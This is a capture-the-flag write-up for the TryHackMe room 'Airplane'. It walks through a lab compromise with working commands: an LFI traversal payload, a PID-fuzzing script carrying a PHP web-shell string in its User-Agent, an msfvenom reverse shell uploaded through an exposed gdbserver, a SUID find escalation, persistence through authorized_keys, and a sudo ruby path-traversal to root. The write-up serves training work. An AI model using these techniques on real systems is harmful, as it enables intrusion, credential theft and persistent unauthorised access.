---
title: THM - Airplane
description: A writeup for the TryHackMe room called Airplane
date: 2024-06-09 00:00:00 +0000
categories: [CTF]
tags: [ctf, web]
image: /assets/img/banners/airplane.jpg
---


The IP for my machine was `10.10.70.6`, first add it to hosts file.
```bash
echo "10.10.70.6 airplane.thm" | sudo tee -a /etc/hosts
```
## Enumeration
Starting with an `nmap` scan using default scripts (`-sC`), service detection (`-sV`), and scanning all ports (`-p-`). `-oA` means output all formats, this is just so I can refer back to it easily
```
nmap -sC -sV -oA airplane_scan -p- airplane.thm
```

We can see a number of open ports:
- SSH running on port 22/TCP - this is almost never the intended initial target
- X11 running on port 6048/TCP
- HTTP running on port 8000/TCP - seems to be running a flask application, as indicated by the fingerprinting results.

## HTTP Server Exploitation - LFI
Navigating to `http://airplane.thm:8000`, we are presented with a site about some planes. Nothing interesting appears in the HTML source of the site (e.g. comments).
![Airplane.thm Site](/assets/img/airplane-thm-site.png)

A URL parameter called `page` is identified. This parameter seems to control what page is displayed to the user, as by default, it reads:
```
http://airplane.thm:8000/?page=index.html
```
### LFI - `/etc/passwd`
This looks rife for a directory traversal attack. Before using burp intruder to fire off an LFI payload list, a basic payload is used (`../../../../../etc/passwd`) and works straight away, resulting in the contents of the machine's `/etc/passwd` file.
> The `/etc/passwd` file on a system displays information about all users on the system - their usernames, ids, groups, login shells, etc. This file can be used to enumerate users on the system (e.g. for further compromise).
{: .prompt-tip }
### LFI - Stealing SSH Keys
The `id_rsa` file in `/home/USER/.ssh` contains a user's private key used for SSH key-based authentication. If we can exfiltrate this file then we can connect as that user via SSH.
We don't know what user the app is running as - so we don't know what user's home directories we will be able to read. We have all the usernames, so let's just try to brute force it.
Using `/etc/passwd` from the previous section:
```zsh
cat etcpasswd | cut -d : -f 1 > users.txt
```
This will create a username list which we can use for fuzzing.
In order to try and steal `id_rsa` for every user:
1. Within burp, intercept the LFI request using the proxy > send to intruder.
2. Add a payload marker on the USER part of the `../../../../../home/USER/.ssh/id_rsa`
3. Set the payload list to the result `users.txt` from the `cut` command.
4. Launch attack and monitor for results with the largest length.

Sadly, this is not yield any results. Let's move onto other services instead.

## X11 Server, or not...
According to `nmap` service detection, the service on port 6048/TCP is X11, which is some sort of tiling / window manager. There are various commands we can use to query this service:
### Poking the X11 Service
> The default port of X11 is 6000. Apparently, the `screen id` of the screen in use is `PORT` - 6000, so for us, it will be 48.
{: .prompt-tip }

First, let's try to verify connectivity, the syntax is:
```zsh
xdpyinfo -display HOST:DISPLAY_NO
xdpyinfo -display airplane.thm:48
```
This command just hung and didn't do anything, perhaps because we require some authentication.

Upon further research, I learned that a file called `.Xauthority` in a user's home directory contains authentication information to connect to X11, similar to `~/.ssh/id_rsa`. Let's try to use our LFI to exfiltrate the `.Xauthority` file, as we did for `id_rsa` by using Burp.

However sadly, once again, this did not yield anything worthwhile.
### `/proc/` Investigation - PID Fuzzing
Not convinced that this service was acting as it should, I began to question whether it was actually X11, and not some other service running on a X11-like port.

The `/proc/` directory can be queried to identify information about running processes. We do not, however, know the PID (process ID) of the service running on 6048/TCP. Given that system / service PIDs are typically in the range of 1-1000, we can use our LFI vulnerability to fuzz PIDs.
> I began by using burp intruder for this, but it was horrifically slow (community edition pain). 
{: .prompt-tip }

I wrote a python script with the help of my mate Chat GPT which would automate this process for PIDs 1-1000:
```python
import requests

# Define the target URL and headers
base_url = "http://airplane.thm:8000/?page=../../../../../../proc/"
headers = {
    'Host': 'airplane.thm:8000',
    'Cache-Control': 'max-age=0',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': '<?php system($_GET[\'c\']); ?>',
    'Accept': '',
    'Accept-Encoding': 'gzip, deflate, br',
    'Accept-Language': 'en-US,en;q=0.9',
    'If-None-Match': '"1713330376.3737798-1515-3732933866"',
    'If-Modified-Since': 'Wed, 17 Apr 2024 05:06:16 GMT',
    'Connection': 'close'
}

# Loop through the PIDs from 1 to 1000
for pid in range(1, 1001):
    url = f"{base_url}{pid}/cmdline"
    try:
        # Make the GET request
        response = requests.get(url, headers=headers)
        # Print the response text
        print(f"Response for PID {pid}:")
        print(response.text)
        if response.text.strip():
            with open(f"{pid}.txt", "w") as file:
                file.write(response.text)
            print(f"Written output of PID {pid} to {pid}.txt")
    except Exception as e:
        print(f"Error with PID {pid}: {e}")
```
I executed the script, and waited for it to write the files 1-1000.txt. 
Next, I ran some shell commands to remove empty files and display the files in a way I could scroll through easy
```zsh
grep -l "Page not found" *.txt | xargs rm
find . -name "*.txt" -exec awk 'FNR==1 {print FILENAME} {print}' {} +
```
Navigating through this output, I spotted the following output:
```
./528.txt
/usr/bin/gdbserver0.0.0.0:6048airplane
```
It looks like the "X11 service" is actually a `gdb` server.
> GDB is GNU debugger, used for debugging applications
{: .prompt-tip }
## Foothold
### Uploading a Shell to remote GDB Server
We can upload our own malicious binary to the remote GDB server. First, let's generate the binary using `msfvenom`
```zsh
msfvenom -p linux/x64/shell_reverse_tcp \
	LHOST=<YOUR_IP> \
	LPORT=4444 \
	PrependFork=true \
	-f elf \
	-o shell.elf

chmod +x shell.elf
```
Next, let's open it in `gdb` (locally). Note: you will need to have GDB installed, you can find installation instruction online.
```zsh
gdb shell.elf
```
Before we upload and execute our shell, in a new terminal, we need a shell listener:
```zsh
nc -lvp 4444
```
Now, within the `gdb` interface, let's connect to the remote server, upload the binary and execute it.
```
(gdb) target extended-remote airplane.thm:6048
(gdb) remote put shell.elf /tmp/shell.elf
(gdb) set remote exec-file /tmp/shell.elf
(gdb) run
```
Now, in our shell we get a call back:
```
listening on [any] 4000 ...
connect to [10.11.47.141] from airplane.thm [10.10.70.6] 54186
whoami
hudson
```
We are the `hudson` user - we have initial access!
> There is no user.txt in `hudson` home directory, it's likely we need to laterally move to `carlos` first.
> {: .prompt-tip }

## Lateral Movement to `carlos` User
During some superficial enumeration of the machine, I looked for binaries with the SUID bit set using the following command:
```zsh
find / -perm /4000 -type f 2>/dev/null
```
I typically do this manually before running something like `linpeas.sh`.

> The SUID bit allows users to execute a file with the permissions of the file owner.
{: .prompt-tip }

```zsh
ls -lh /usr/bin/find
-rwsr-xr-x 1 carlos carlos 313K Feb 18  2020 /usr/bin/find
```
So we can run `/usr/bin/find` as `carlos`. Let's look in [GTFO Bins](https://gtfobins.github.io/gtfobins/find/) for an escalation method. This command will work and give us a shell as `carlos`:
```zsh
/usr/bin/find . -exec /bin/bash -p \;

bash-5.0$ whoami
whoami
carlos
```
Now, let's get that user flag from `carlos` home directory!
```zsh
cat /home/carlos/user.txt
eeb******************562
```
## Privilege Escalation to Root
### Shell Stabilisation - SSH
There are few things that exist in this world that are worse than a raw `netcat` shell, so for the sake of sanity, let's add our SSH public key to `/home/carlos/.ssh/authorized_keys`.
```zsh
echo "<CONTENTS_OF_YOUR_/HOME/USER/.SSH/ID_RSA.PUB" >> /home/carlos/.ssh/authorized_keys
```
Now, we can SSH into the machine as `carlos`, and we will get an SSH (stable) shell, much better.
```zsh
ssh carlos@airplane
...
carlos@airplane:~$
```
### Interesting `Sudo` Permissions
As with any machine, I begin by running `sudo -l` to see if my user can run anything as root.

Interesting, we can observe the following entry:
```zsh
(ALL) NOPASSWD: /usr/bin/ruby /root/*.rb
```
This means that we can run `/usr/bin/ruby` as root, but only with any file ending in `.rb` within the `/root/` directory as an argument.

This is not secure as it only checks that `/root/` is the first thing in the argument, after that, it doesn't care. This means that we can do: `/root/../home/carlos/evil_script.rb`, or similar.

First, let's create a ruby file which will read the contents of `/root/root.txt`, as we know this is where the flag will be (THM is consistent with this). Let's put it in `carlos` home directory, I called it `evil_script.rb`
```ruby
#!/usr/bin/env ruby

file_path = '/root/root.txt'

begin
  content = File.read(file_path)
  puts content
rescue Errno::EACCES
  puts "Permission denied: #{file_path}"
rescue Errno::ENOENT
  puts "File not found: #{file_path}"
rescue => e
  puts "An error occurred: #{e.message}"
end
```

Now, let's execute it using the insecure `sudo` configuration
```zsh
sudo /usr/bin/ruby /root/../home/carlos/evil_script.rb
190d****************e002
```
